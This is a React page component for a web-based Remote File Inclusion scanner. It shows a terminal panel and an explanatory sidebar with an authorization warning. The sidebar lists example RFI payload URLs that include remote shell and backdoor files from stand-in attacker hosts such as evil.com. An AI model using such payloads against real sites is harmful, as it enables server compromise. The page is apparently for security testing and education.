import { useEffect } from "react";
import { useTerminal } from "@/hooks/use-terminal";
import RfiScanner from "@/components/tools/rfi-scanner";
import { MatrixBackground } from "@/components/matrix-background";
import Terminal from "@/components/terminal";

export default function RfiScannerPage() {
  const terminal = useTerminal();

  useEffect(() => {
    // Add some initial terminal messages when the page loads
    terminal.addSystemLine("RFI Scanner module initialized");
    terminal.addInfoLine("Ready to scan for Remote File Inclusion vulnerabilities.");
  }, [terminal]);

  return (
    <div className="container mx-auto px-4 py-8">
      <div className="relative mb-8 p-6 rounded-lg overflow-hidden">
        <MatrixBackground />
        <h1 className="text-3xl font-tech mb-4 text-center text-primary">Remote File Inclusion Scanner</h1>
        <p className="text-center font-mono text-muted-foreground max-w-2xl mx-auto">
          Detect Remote File Inclusion (RFI) vulnerabilities in web applications that could
          allow attackers to execute malicious code from external servers.
        </p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2">
          <RfiScanner />
        </div>
        
        <div className="lg:col-span-1">
          <div className="bg-card border border-secondary/30 rounded-md p-4 mb-6">
            <h2 className="text-xl font-tech text-secondary mb-4">About RFI Vulnerabilities</h2>
            <div className="space-y-3 text-sm font-mono">
              <p>
                Remote File Inclusion (RFI) is a vulnerability that allows attackers to include 
                malicious files from external servers, leading to code execution, data theft, or 
                complete server compromise.
              </p>
              <p>
                Common vulnerable patterns include:
              </p>
              <div className="ml-2 space-y-1">
                <p>• <span className="text-amber-500">page.php?file=http://evil.com/shell.php</span></p>
                <p>• <span className="text-amber-500">include.php?path=http://attacker.com/backdoor.php</span></p>
                <p>• <span className="text-amber-500">view.php?page=https://malicious-site.com/code.php</span></p>
              </div>
              <div className="p-2 rounded-md bg-red-500/10 mt-2 border border-red-500/20">
                <p className="text-xs text-red-500">
                  <span className="font-bold">Warning:</span> Only use this tool on systems you own or have explicit permission to test.
                  Unauthorized testing may be illegal and unethical.
                </p>
              </div>
            </div>
          </div>
          
          <div className="bg-card border border-accent/30 rounded-md p-4">
            <h2 className="text-lg font-tech text-accent mb-4">Terminal Output</h2>
            <Terminal className="h-80 text-xs" lines={terminal.lines} />
          </div>
        </div>
      </div>
    </div>
  );
}